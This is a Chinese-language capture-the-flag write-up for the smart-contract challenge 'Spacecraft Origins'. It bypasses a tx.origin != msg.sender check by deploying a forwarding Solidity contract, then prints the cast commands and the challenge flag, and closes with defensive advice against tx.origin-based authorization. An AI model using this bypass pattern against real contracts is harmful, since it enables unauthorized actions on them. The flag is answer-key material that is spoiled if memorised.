# Spacecraft Origins

## 题目简述

`AstroManager.allocateResources()` 要求 `tx.origin != msg.sender` 才把 `resourcesAllocated` 设为 `true`。EOA 直接调用时两者相同；通过中间合约转发时，`tx.origin` 仍是最初发起交易的 EOA，而 `msg.sender` 变为中间合约地址，因此可以满足条件。

## 解题过程

先从 `Setup` 读取目标地址：

```bash
TARGET=$(cast call "$SETUP" "TARGET()(address)" --rpc-url "$RPC")
```

部署一个只负责转发调用的辅助合约：

```solidity
pragma solidity ^0.8.13;

interface IAstroManager {
    function allocateResources() external;
}

contract SpaceCraft {
    IAstroManager public manager;

    constructor(address target) {
        manager = IAstroManager(target);
    }

    function allocate() external {
        manager.allocateResources();
    }
}
```

调用 `SpaceCraft.allocate()` 时，目标合约观察到：

```text
tx.origin  = 玩家 EOA
msg.sender = SpaceCraft 合约
```

二者不同，检查通过。最后验证：

```bash
cast call "$SETUP" "isSolved()(bool)" --rpc-url "$RPC"
```

官方解法给出的 flag 为：

```text
shellmates{he4v3NLy_0RiG1n4Ted_Tr4N$4ct1On}
```

## 方法总结

- 核心技巧：通过中间合约制造 `tx.origin` 与 `msg.sender` 的身份差异。
- 识别信号：合约使用 `tx.origin` 判断调用者类型或授权时，应立即检查代理合约、钱包合约和调用链能否改变直接调用者。
- 复用要点：授权应基于明确的 `msg.sender`、签名或角色状态；`tx.origin` 会跨越整条调用链，既不能可靠区分“人”和“合约”，也容易形成钓鱼式调用问题。
